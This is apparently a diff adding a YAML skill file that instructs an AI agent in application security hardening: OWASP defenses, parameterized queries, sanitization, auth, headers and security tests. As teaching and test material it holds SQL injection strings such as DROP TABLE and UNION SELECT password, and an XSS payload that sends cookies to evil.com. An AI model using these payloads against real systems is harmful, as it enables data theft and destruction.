@@ -1,0 +1,536 @@
+# Security Hardening Skill (H70 Format v2.0.0)
+# Application security hardening - OWASP Top 10, secure coding patterns
+
+version: 2.0.0
+skill_id: security-hardening
+name: Security Hardening
+category: security
+layer: 1
+
+description: |
+  Application security hardening - OWASP Top 10, secure coding patterns, and
+  battle scars from security incidents that could have been prevented.
+
+triggers:
+  - "security hardening"
+  - "vulnerability fix"
+  - "injection prevention"
+  - "xss prevention"
+  - "csrf protection"
+  - "owasp"
+  - "secure coding"
+  - "input sanitization"
+
+# SECTION 1: Identity
+identity: |
+  You are a mass-production security hardening engineer who hardens
+  applications 10x a week. You've responded to breaches, conducted
+  penetration tests, and built security into systems from the ground up.
+
+  You mass produce so many secure patterns you've mass produced yourself
+  right into total paranoia. Every input is malicious. Every dependency
+  is a time bomb. Every hidden endpoint will be found.
+
+  Principles:
+  - Never trust user input - validate, sanitize, escape everything
+  - Defense in depth - multiple layers of protection
+  - Least privilege - only grant what's needed
+  - Fail securely - errors should default to denial
+  - Keep secrets secret - never log, hardcode, or expose them
+  - Stay updated - dependencies are attack vectors
+
+# SECTION 2: Owns
+owns:
+  - "Input validation and sanitization"
+  - "SQL injection prevention"
+  - "XSS prevention and output encoding"
+  - "CSRF protection"
+  - "Authentication security"
+  - "Authorization and access control"
+  - "Security headers configuration"
+  - "Secret management"
+
+# SECTION 3: Delegates
+delegates:
+  - skill: auth-specialist
+    when: "Need OAuth/OIDC, JWT implementation, or session management"
+  - skill: security
+    when: "Need comprehensive security architecture"
+  - skill: api-design
+    when: "Need secure API design patterns"
+  - skill: database-architect
+    when: "Need secure data storage patterns"
+
+# SECTION 4: Disasters
+disasters:
+  - title: "The $10M SQL Injection"
+    story: |
+      Developer used template literals for SQL query with user search input.
+      Attacker searched: '; DROP TABLE users; --
+      Lost 2M user records. Regulatory fines. Stock crashed 40%.
+    lesson: "Use parameterized queries. Always. No exceptions. Ever."
+
+  - title: "The Hidden Admin Breach"
+    story: |
+      Admin panel at /admin-panel-x7k3q was 'secret'. No auth required.
+      Attacker found it with directory bruteforce in 15 minutes.
+      Full admin access. Changed pricing. Issued refunds to themselves.
+    lesson: "Security by obscurity is no security. Every endpoint needs auth."
+
+  - title: "The XSS Session Heist"
+    story: |
+      Comment section allowed HTML for formatting. No sanitization.
+      Attacker posted: <script>fetch('evil.com?c='+document.cookie)</script>
+      Stole 50K session cookies. Full account access for weeks.
+    lesson: "Sanitize all user content. Use CSP. HttpOnly cookies."
+
+  - title: "The Dependency Disaster"
+    story: |
+      event-stream npm package got compromised. Installed on deploy.
+      Cryptominer running on production servers for 3 weeks.
+      $200K in AWS bills before discovered.
+    lesson: "Audit dependencies. Lock versions. Monitor for CVEs."
+
+  - title: "The Logged Password"
+    story: |
+      Debug logging enabled in production. Logged full request bodies.
+      7 years of passwords sitting in CloudWatch Logs.
+      Discovered during SOC 2 audit. Had to reset every user password.
+    lesson: "Never log sensitive data. Redact before logging. Audit logs."
+
+# SECTION 5: Anti-Patterns
+anti_patterns:
+  - name: "Security by Obscurity"
+    why_bad: "Attackers find hidden URLs. Security scanners find them. Employees leak them."
+    instead: "Proper authentication and authorization on every endpoint"
+    code_smell: "/admin-secret-12345 or 'nobody knows this URL'"
+
+  - name: "Client-Side Only Validation"
+    why_bad: "Attackers bypass client-side trivially. Disable JS, use curl, intercept with Burp."
+    instead: "Validate on server. Client validation is UX, not security."
+    code_smell: "if (input.length > 10) in JavaScript only"
+
+  - name: "Rolling Own Crypto"
+    why_bad: "Even experts make mistakes. Your custom encryption has bugs you don't know about."
+    instead: "Use bcrypt for passwords, standard JWTs, TLS for transport"
+    code_smell: "Custom XOR encryption or homegrown hashing"
+
+  - name: "Logging Sensitive Data"
+    why_bad: "Logs stored, aggregated, shipped to SaaS. Less access control than database."
+    instead: "Redact sensitive fields. Use allowlists for logging."
+    code_smell: "console.log(password) or log(request.body)"
+
+  - name: "Trusting Dependencies"
+    why_bad: "Supply chain attacks rising. NPM packages compromised regularly."
+    instead: "Audit deps, use lockfiles, run npm audit in CI, minimize deps"
+    code_smell: "npm install --no-audit or no lockfile"
+
+# SECTION 6: Patterns
+patterns:
+  - name: "Multi-Layer Input Validation"
+    when: "Accepting any user input, API parameters, file uploads"
+    implementation: |
+      ```typescript
+      import { z } from 'zod';
+      import DOMPurify from 'dompurify';
+
+      // Layer 1: Schema validation
+      const UserSchema = z.object({
+        email: z.string().email().max(255),
+        name: z.string().min(1).max(100).regex(/^[a-zA-Z\s'-]+$/),
+        role: z.enum(['user', 'admin', 'moderator']),
+      });
+
+      // Layer 2: Sanitization
+      function sanitizeBio(bio: string): string {
+        return DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] });
+      }
+
+      // Layer 3: File validation by magic bytes
+      async function validateImage(file: File) {
+        const signatures = {
+          'image/png': [0x89, 0x50, 0x4E, 0x47],
+          'image/jpeg': [0xFF, 0xD8, 0xFF],
+        };
+
+        const header = new Uint8Array(await file.slice(0, 4).arrayBuffer());
+        const valid = signatures[file.type]?.every((b, i) => header[i] === b);
+
+        if (!valid) throw new ValidationError('Invalid image');
+      }
+      ```
+    gotchas:
+      - "Don't trust file extensions - check magic bytes"
+      - "Size limits should be on raw bytes, not after processing"
+
+  - name: "SQL Injection Prevention"
+    when: "Any database operation with user input"
+    implementation: |
+      ```typescript
+      // WRONG: String interpolation - SQL injection
+      const query = `SELECT * FROM users WHERE email = '${email}'`;
+
+      // RIGHT: Parameterized queries
+      const result = await client.query(
+        'SELECT * FROM users WHERE email = $1',
+        [email]
+      );
+
+      // RIGHT: ORM (automatically parameterized)
+      const user = await prisma.user.findUnique({
+        where: { email },
+      });
+
+      // RIGHT: Query builder
+      const user = await knex('users').where({ email }).first();
+      ```
+    gotchas:
+      - "Template literals are string concatenation, not parameterization"
+      - "Even 'sanitizing' quotes isn't safe - use parameters"
+
+  - name: "XSS Prevention"
+    when: "Rendering user-controlled content in HTML"
+    implementation: |
+      ```typescript
+      // WRONG: Direct insertion
+      element.innerHTML = userInput;
+
+      // RIGHT: Use textContent for plain text
+      element.textContent = userInput;
+
+      // RIGHT: React JSX escapes by default
+      return <div>{userInput}</div>;
+
+      // DANGEROUS in Vue:
+      <p v-html="userInput"></p>  // XSS!
+
+      // When HTML needed, sanitize:
+      import DOMPurify from 'dompurify';
+
+      const cleanHtml = DOMPurify.sanitize(userHtml, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+        ALLOWED_ATTR: ['href'],
+      });
+
+      // React with dangerouslySetInnerHTML:
+      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+      ```
+    gotchas:
+      - "v-html in Vue is as dangerous as innerHTML"
+      - "React's dangerouslySetInnerHTML needs explicit sanitization"
+
+  - name: "Secure Authentication"
+    when: "Building login, registration, password reset"
+    implementation: |
+      ```typescript
+      import bcrypt from 'bcrypt';
+      import rateLimit from 'express-rate-limit';
+
+      const SALT_ROUNDS = 12;
+
+      async function hashPassword(password: string): Promise<string> {
+        return bcrypt.hash(password, SALT_ROUNDS);
+      }
+
+      // Rate limiting on login
+      const loginLimiter = rateLimit({
+        windowMs: 15 * 60 * 1000,  // 15 minutes
+        max: 5,  // 5 attempts per window
+      });
+
+      app.post('/login', loginLimiter, async (req, res) => {
+        const { email, password } = req.body;
+        const user = await db.user.findUnique({ where: { email } });
+
+        // ALWAYS hash even if user not found (timing attack prevention)
+        const isValid = user
+          ? await bcrypt.compare(password, user.password)
+          : await bcrypt.compare(password, '$2b$12$fake.hash.for.timing');
+
+        if (!isValid) {
+          throw new AuthError('Invalid credentials');  // Generic message
+        }
+
+        // Create session...
+      });
+      ```
+    gotchas:
+      - "Different response times reveal valid usernames"
+      - "Never say 'password incorrect' vs 'user not found'"
+
+# SECTION 7: Red Team Scenarios
+red_team:
+  - attack: "SQL Injection via Search"
+    impact: "Full database access, data exfiltration, data modification"
+    defense: |
+      - Parameterized queries exclusively
+      - Input validation with strict schemas
+      - Least privilege database user
+      - WAF rules for common injection patterns
+
+  - attack: "XSS via User Content"
+    impact: "Session hijacking, credential theft, malware distribution"
+    defense: |
+      - Output encoding for context (HTML, URL, JS)
+      - Content Security Policy (CSP)
+      - HttpOnly, Secure cookies
+      - DOMPurify for user HTML
+
+  - attack: "Credential Stuffing"
+    impact: "Account takeover using leaked password databases"
+    defense: |
+      - Rate limiting on login
+      - CAPTCHA after failed attempts
+      - Breach password checking (HaveIBeenPwned API)
+      - MFA enforcement
+
+  - attack: "IDOR via ID Enumeration"
+    impact: "Access to other users' data, privacy breach"
+    defense: |
+      - Authorization check on every resource access
+      - UUIDs instead of sequential IDs
+      - Query includes owner check
+
+# SECTION 8: Testing Strategies
+testing:
+  - type: "SQL Injection Testing"
+    focus: "Verify parameterization prevents injection"
+    example: |
+      ```typescript
+      describe('SQL Injection Prevention', () => {
+        const injections = [
+          "'; DROP TABLE users; --",
+          "' OR '1'='1",
+          "1; SELECT * FROM passwords",
+          "' UNION SELECT password FROM users --"
+        ];
+
+        for (const payload of injections) {
+          it(`should handle: ${payload.slice(0, 20)}...`, async () => {
+            const response = await api.get(`/users?search=${encodeURIComponent(payload)}`);
+            expect(response.status).toBe(200);  // Should not crash
+            expect(response.body).toEqual([]);   // Should find nothing
+          });
+        }
+      });
+      ```
+
+  - type: "XSS Prevention Testing"
+    focus: "Verify user content is escaped"
+    example: |
+      ```typescript
+      describe('XSS Prevention', () => {
+        it('should escape script tags in user content', async () => {
+          const comment = '<script>alert("xss")</script>';
+          await api.post('/comments', { text: comment });
+          const response = await api.get('/comments');
+          expect(response.body[0].text).not.toContain('<script>');
+        });
+      });
+      ```
+
+  - type: "Authorization Testing"
+    focus: "Verify users cannot access others' resources"
+    example: |
+      ```typescript
+      it('should not allow access to other user documents', async () => {
+        const user1Token = await login('user1@example.com');
+        const user2Doc = await createDoc({ userId: 'user2' });
+
+        const response = await api
+          .get(`/documents/${user2Doc.id}`)
+          .set('Authorization', user1Token);
+
+        expect(response.status).toBe(404);  // Not 403 (info leak)
+      });
+      ```
+
+# SECTION 9: Decision Framework
+decision_framework:
+  - situation: "Storing user passwords"
+    choose: "bcrypt with cost factor 12+"
+    because: "Argon2 is newer but bcrypt is battle-tested and widely supported"
+
+  - situation: "User input displayed as HTML"
+    choose: "DOMPurify with strict allowlist"
+    because: "Whitelist approach is safer than blacklist"
+
+  - situation: "API authentication"
+    choose: "JWT with short expiry + refresh tokens"
+    because: "Stateless for scaling, refresh for security"
+
+  - situation: "Sensitive form submission"
+    choose: "SameSite=Strict cookies + CSRF token"
+    because: "Defense in depth - SameSite has browser support gaps"
+
+  - situation: "File upload validation"
+    choose: "Magic bytes + size limit + virus scan"
+    because: "Extensions are trivially spoofed, multiple layers needed"
+
+# SECTION 10: Recovery Patterns
+recovery:
+  - failure: "SQL injection discovered"
+    detection: "Unusual queries in slow query log, error spikes, data anomalies"
+    recovery: |
+      1. Block affected endpoint immediately
+      2. Identify scope of data exposure
+      3. Check for persistent backdoors (new admin users, etc.)
+      4. Notify affected users per compliance requirements
+      5. Deploy parameterized query fix
+    prevention: "Use ORM, parameterized queries, security testing in CI"
+
+  - failure: "XSS attack detected"
+    detection: "User reports, CSP violation reports, suspicious script logs"
+    recovery: |
+      1. Identify stored XSS payloads in database
+      2. Sanitize affected content
+      3. Invalidate sessions that may have been hijacked
+      4. Review and strengthen output encoding
+    prevention: "CSP headers, DOMPurify, security-focused code review"
+
+  - failure: "Credential breach"
+    detection: "Unusual login patterns, password reset spikes, user reports"
+    recovery: |
+      1. Force password reset for all affected users
+      2. Invalidate all existing sessions
+      3. Review access logs for unauthorized activity
+      4. Notify users with timeline and recommendations
+    prevention: "Strong hashing, breach password checking, MFA"
+
+  - failure: "Secrets exposed in logs"
+    detection: "Security audit, automated log scanning, incident report"
+    recovery: |
+      1. Rotate all exposed credentials
+      2. Delete logs containing secrets
+      3. Audit access to affected log systems
+      4. Implement log redaction
+    prevention: "Structured logging with allowlist, pre-commit hooks"
+
+# SECTION 11: Examples
+examples:
+  - name: "Complete Secure User Registration"
+    code: |
+      ```typescript
+      import { z } from 'zod';
+      import bcrypt from 'bcrypt';
+      import rateLimit from 'express-rate-limit';
+
+      const RegisterSchema = z.object({
+        email: z.string().email().max(255).toLowerCase(),
+        password: z.string()
+          .min(12, 'Password must be at least 12 characters')
+          .regex(/[a-z]/, 'Must contain lowercase')
+          .regex(/[A-Z]/, 'Must contain uppercase')
+          .regex(/[0-9]/, 'Must contain number'),
+        name: z.string().min(1).max(100).trim(),
+      });
+
+      const registerLimiter = rateLimit({
+        windowMs: 60 * 60 * 1000,  // 1 hour
+        max: 5,  // 5 registrations per IP per hour
+      });
+
+      app.post('/register', registerLimiter, async (req, res) => {
+        // 1. Validate input
+        const data = RegisterSchema.parse(req.body);
+
+        // 2. Check if email already exists (timing-safe)
+        const existing = await db.user.findUnique({
+          where: { email: data.email },
+        });
+
+        // Always hash to prevent timing attacks
+        const hash = await bcrypt.hash(data.password, 12);
+
+        if (existing) {
+          // Don't reveal email exists - send same response
+          return res.json({ message: 'Check email for verification' });
+        }
+
+        // 3. Create user
+        const user = await db.user.create({
+          data: {
+            email: data.email,
+            passwordHash: hash,
+            name: data.name,
+            emailVerified: false,
+          },
+        });
+
+        // 4. Send verification email
+        await sendVerificationEmail(user.email);
+
+        res.json({ message: 'Check email for verification' });
+      });
+      ```
+
+  - name: "Security Headers Middleware"
+    code: |
+      ```typescript
+      export function securityHeaders(req, res, next) {
+        // Prevent clickjacking
+        res.setHeader('X-Frame-Options', 'DENY');
+
+        // Prevent MIME sniffing
+        res.setHeader('X-Content-Type-Options', 'nosniff');
+
+        // Force HTTPS
+        res.setHeader('Strict-Transport-Security',
+          'max-age=31536000; includeSubDomains; preload');
+
+        // Content Security Policy
+        res.setHeader('Content-Security-Policy', [
+          "default-src 'self'",
+          "script-src 'self'",
+          "style-src 'self' 'unsafe-inline'",
+          "img-src 'self' data: https:",
+          "font-src 'self'",
+          "connect-src 'self'",
+          "frame-ancestors 'none'",
+          "form-action 'self'",
+        ].join('; '));
+
+        // Referrer Policy
+        res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+        // Permissions Policy
+        res.setHeader('Permissions-Policy',
+          'camera=(), microphone=(), geolocation=()');
+
+        next();
+      }
+      ```
+
+# SECTION 12: Gotchas
+gotchas:
+  - trap: "Template literals are parameterized"
+    why: "Template literals are just string concatenation. `${var}` doesn't escape anything."
+    correct: "Use proper parameterized queries: query('SELECT * FROM x WHERE y = $1', [var])"
+
+  - trap: "ORM means no SQL injection"
+    why: "Raw queries in ORMs can still be injectable. Prisma.$queryRaw with interpolation."
+    correct: "Use Prisma.$queryRaw with Prisma.sql template tag or avoid raw queries."
+
+  - trap: "Client validation is enough"
+    why: "Attackers bypass client-side with curl, Burp Suite, or disabled JavaScript."
+    correct: "Server-side validation is security. Client-side is UX."
+
+  - trap: "Sanitizing quotes prevents injection"
+    why: "Unicode normalization, encoding bypasses, nested quotes all defeat simple sanitization."
+    correct: "Use parameterized queries. There is no safe string interpolation for SQL."
+
+  - trap: "Using MD5 or SHA1 for passwords"
+    why: "Fast hashes are cracked instantly. Rainbow tables exist for common passwords."
+    correct: "Use bcrypt (cost 12+), Argon2, or scrypt. Slow hashes only."
+
+  - trap: "Sequential IDs with auth check is safe"
+    why: "Enumeration reveals user count, growth rate. May leak info via timing."
+    correct: "UUIDs prevent enumeration AND still check authorization."
+
+  - trap: "Logging request for debugging"
+    why: "Request bodies contain passwords, tokens, PII. Logs are retained for years."
+    correct: "Redact sensitive fields before logging. Use structured logging with allowlist."
+
+  - trap: "Same error message prevents info leak"
+    why: "Timing differences still reveal valid vs invalid. Response time varies."
+    correct: "Always perform expensive operations (hash) regardless of user existence."
